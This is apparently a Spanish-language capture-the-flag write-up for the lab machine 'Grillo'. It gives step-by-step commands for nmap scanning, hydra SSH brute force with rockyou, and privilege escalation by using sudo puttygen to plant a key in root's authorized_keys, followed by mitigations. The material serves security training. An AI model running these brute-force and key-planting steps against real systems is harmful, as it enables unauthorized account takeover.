# Write-Up – Grillo | The Hacker Labs

## Información General

| Campo | Detalle |
|---|---|
| **Máquina** | Grillo |
| **Plataforma** | The Hacker Labs |
| **Dificultad** | Beginner |
| **SO Víctima** | Linux |
| **IP Víctima** | 10.0.50.34 |
| **IP Atacante** | Kali Linux |
| **Objetivo** | user.flag + root.flag |

---

## Cadena de Ataque

```
Nmap → Comentario HTML con usuario → Fuerza bruta SSH → sudo puttygen → Clave RSA → root
```

---

## 1. Reconocimiento

Escaneo completo de puertos:

```bash
nmap -sS -sC -sV -p- 10.0.50.34
```

Puertos abiertos:

```
22/tcp  open  ssh
80/tcp  open  http
```

---

## 2. Enumeración Web

Inspección del servicio HTTP:

```bash
curl -s http://10.0.50.34:80
```

Se identificó un comentario HTML en el código fuente:

```html
<!-- Cambia la contraseña de ssh por favor melanie -->
```

**Usuario identificado:** `melanie`

Esta es una fuga de información crítica que revela un usuario válido del sistema directamente en el código fuente de la web.

---

## 3. Acceso Inicial – Fuerza Bruta SSH

Con el usuario identificado se procedió a fuerza bruta sobre el servicio SSH:

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://10.0.50.34
```

Credenciales encontradas:

```
[22][ssh] host: 10.0.50.34   login: melanie   password: trustno1
```

Acceso al sistema:

```bash
ssh melanie@10.0.50.34
```

---

## 4. Post-Explotación

### User Flag

Una vez dentro se lista el directorio y se obtiene el `user.txt`.

### Enumeración de privilegios sudo

```bash
sudo -l
```

Resultado:

```
(root) NOPASSWD: /usr/bin/puttygen
```

### Descubrimiento del symlink

Se identificó un enlace simbólico relevante:

```
lrwxrwxrwx 1 melanie concebolla 14 ene 7 18:01 flag -> /root/root.txt
```

Esto indica que `flag` apunta directamente a `/root/root.txt`. El vector de escalada es `puttygen`.

### Enumeración del grupo concebolla

```bash
find / -group concebolla 2>/dev/null
```

Búsqueda de archivos de interés dentro del grupo:

```bash
find / -group concebolla -type f \( -name "*.txt" -o -name "*.sh" -o -name "*flag*" -o -name "note*" \) 2>/dev/null
```

---

## 5. Escalada de Privilegios – Abuso de sudo puttygen

### ¿Qué es puttygen?

`puttygen` es la herramienta de línea de comandos de PuTTY para generar y manipular claves SSH. Aunque originalmente es una utilidad de Windows, está disponible en Linux como parte del paquete `putty-tools`.

Su abuso es posible porque puede **escribir la clave pública generada directamente en rutas del sistema** cuando se ejecuta como root, en este caso sobreescribiendo `/root/.ssh/authorized_keys`.

### Explotación

**Paso 1 – Generar clave privada RSA:**

```bash
puttygen -t rsa -o id_rsa -O private-openssh
```

**Paso 2 – Dar permisos correctos:**

```bash
chmod 600 id_rsa
```

**Paso 3 – Escribir la clave pública en authorized_keys de root:**

```bash
sudo /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Al ejecutarse con `sudo`, `puttygen` escribe nuestra clave pública en el archivo `authorized_keys` de root, permitiendo acceso SSH sin contraseña.

**Paso 4 – Conectarse como root:**

```bash
ssh -i id_rsa root@10.0.50.34
```

✅ **Acceso root obtenido.**

---

## 6. Root Flag

```bash
cat /root/root.txt
```

---

## 7. Vulnerabilidades Identificadas

| Vulnerabilidad | Descripción |
|---|---|
| Fuga de información en HTML | Usuario `melanie` expuesto en comentario del código fuente |
| Credenciales débiles | `melanie:trustno1` — contraseña del diccionario rockyou |
| Mala configuración sudo | `puttygen` ejecutable como root permite escribir en archivos del sistema |
| Symlink a archivo de root | `flag -> /root/root.txt` accesible por el grupo `concebolla` |

---

## 8. Mitigaciones Recomendadas

- Eliminar comentarios con información sensible del código fuente
- Aplicar política de contraseñas seguras
- Revisar y restringir las entradas en `/etc/sudoers`
- Aplicar principio de mínimo privilegio
- Auditar symlinks con permisos de grupo inadecuados

---

## 9. Lecciones Aprendidas

- Revisar siempre el **código fuente** de la web y buscar comentarios HTML — pueden revelar usuarios, rutas o credenciales.
- `sudo -l` es obligatorio tras obtener acceso inicial.
- Consultar **GTFOBins** para cualquier binario con permisos sudo: `puttygen` permite escritura arbitraria de archivos como root.
- Un symlink apuntando a un archivo de root es una señal clara del vector de escalada.

---

*Write-up educativo – The Hacker Labs | Autor: Pablo Romo González*
